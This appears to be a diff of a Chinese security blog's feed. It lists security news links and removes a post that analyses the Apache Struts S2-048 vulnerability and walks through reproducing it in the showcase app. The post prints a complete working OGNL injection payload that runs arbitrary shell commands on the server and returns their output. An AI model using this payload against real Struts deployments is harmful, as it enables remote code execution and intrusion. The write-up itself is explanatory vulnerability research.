 <li>新版本 C++ 语言（C++ 17/14/11）的新特性整理 <a href="https://github.com/AnthonyCalandra/modern-cpp-features" target="_blank" rel="external">https://github.com/AnthonyCalandra/modern-cpp-features</a></li>
 <li>SlackShell - 基于 Slack API 的 PowerShell 版本 C&amp;C 命令控制实现<br><a href="https://github.com/bkup/SlackShell" target="_blank" rel="external">https://github.com/bkup/SlackShell</a></li>
 <li>Social Engineering Toolkit (SET) v7.7 发布 <a href="https://github.com/trustedsec/social-engineer-toolkit/releases/tag/7.7" target="_blank" rel="external">https://github.com/trustedsec/social-engineer-toolkit/releases/tag/7.7</a></li>
@@ -820,38 +884,6 @@
     </summary>
     
       <category term="每日安全动态" scheme="http://kevien.github.io/categories/%E6%AF%8F%E6%97%A5%E5%AE%89%E5%85%A8%E5%8A%A8%E6%80%81/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>s2-048漏洞分析</title>
-    <link href="http://kevien.github.io/2017/07/08/s2-048%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
-    <id>http://kevien.github.io/2017/07/08/s2-048漏洞分析/</id>
-    <published>2017-07-08T04:10:52.000Z</published>
-    <updated>2017-07-08T15:01:33.000Z</updated>
-    
-    <content type="html"><![CDATA[<h4 id="0x01-前言"><a href="#0x01-前言" class="headerlink" title="0x01 前言"></a>0x01 前言</h4><p>&nbsp;&nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 <a href="https://cwiki.apache.org/confluence/display/WW/S2-048" target="_blank" rel="external">https://cwiki.apache.org/confluence/display/WW/S2-048</a>。同事大佬看后分分钟出了漏洞分析文章(自己还是太菜QWQ),晚上的时候简单的复现了一下，今天没事儿就跟了一下。</p>
-<h4 id="0x02-从官方通告到poc"><a href="#0x02-从官方通告到poc" class="headerlink" title="0x02 从官方通告到poc"></a>0x02 从官方通告到poc</h4><p>&nbsp;&nbsp; 从官方通告到概念性证明这是一个考验能力的地方，但是万事都有技巧和经验。官方通告往往信息量是最大的，首先，通过官方通告如下图所示可以得到至少五个重要的信息点<br><img src="/2017/07/08/s2-048漏洞分析/1.png" alt=""></p>
-<ul>
-<li>1.这是一个远程命令执行漏洞</li>
-<li>2.这个漏洞存在showcase示例应用中，这个很重要，能让我们最快的时间去找到相应的漏洞环境</li>
-<li>3.这个漏洞struts1的插件有关</li>
-<li>4.这个漏洞影响的版本是struts 2.3x系列</li>
-<li>5.漏洞的解决方法，这里是代码的正确写法，此处是找到漏洞触发点的关键<br>1.首先，我们从官网<a href="http://struts.apache.org/download.cgi#struts25101" target="_blank" rel="external">http://struts.apache.org/download.cgi#struts25101</a>下载对应的struts以及showcase。<br>2.将war包部署到应用服务器，我这里用了tomcat，打开struts-showcase如下图所示：<br><img src="/2017/07/08/s2-048漏洞分析/2.png" alt=""><br>3.查找关键性代码<br><img src="/2017/07/08/s2-048漏洞分析/3.png" alt=""><br>可以看到箭头所指的地方就使用到了官方不’提倡’使用的规范，应该就是这个地方了。<br>打开这个页面可以看到这里有三个输入的地方，这里应该就是恶意代码插入的地方。<br><img src="/2017/07/08/s2-048漏洞分析/4.png" alt=""><br>4.代码调试<br>这个时候就该上eclipse了，跟踪一下数据流向。我们先在此处加个断点<br><img src="/2017/07/08/s2-048漏洞分析/5.png" alt=""><br>通过调试会发现M0rk参数会进入buildMessageFormat()这个函数里面<br><img src="/2017/07/08/s2-048漏洞分析/6.png" alt=""><br>很熟悉有木有，这个就是s2-045漏洞(详见之前的文章<a href="http://www.cnblogs.com/mrchang/p/6515150.html" target="_blank" rel="external">http://www.cnblogs.com/mrchang/p/6515150.html</a>)里面的利用点，直接利用不就行了嘛。直接将name参数修改为s2-045的payload就行了.<br>payload如下：<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">%&#123;(#szgx=&apos;multipart/form-data&apos;).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[&apos;com.opensymphony.xwork2.ActionContext.container&apos;]).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=&apos; open /Applications/Calculator.app&apos;).(#iswin=(@java.lang.System@getProperty(&apos;os.name&apos;).toLowerCase().contains(&apos;win&apos;))).(#cmds=(#iswin?&#123;&apos;cmd.exe&apos;,&apos;/c&apos;,#cmd&#125;:&#123;&apos;/bin/bash&apos;,&apos;-c&apos;,#cmd&#125;)).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.close())&#125;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p><img src="/2017/07/08/s2-048漏洞分析/7.png" alt=""></p>
-<h4 id="0X03-总结"><a href="#0X03-总结" class="headerlink" title="0X03 总结"></a>0X03 总结</h4><p>&nbsp;&nbsp; 这里没有具体的分析这个struts1插件功能以及payload，只是简单和大家分享一下从官方通告到自己出poc的一个流程，还是有经验可循的，当你分析的漏洞多了，这个过程会很快。<br>水了一篇：）</p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h4 id=&quot;0x01-前言&quot;&gt;&lt;a href=&quot;#0x01-前言&quot; class=&quot;headerlink&quot; title=&quot;0x01 前言&quot;&gt;&lt;/a&gt;0x01 前言&lt;/h4&gt;&lt;p&gt;&amp;nbsp;&amp;nbsp;  昨天下午下班前看到朋友圈有人已经在转发s2-048的漏洞通告，见链接 &lt;
-    
-    </summary>
-    
-      <category term="漏洞分析" scheme="http://kevien.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
     
     
   </entry>
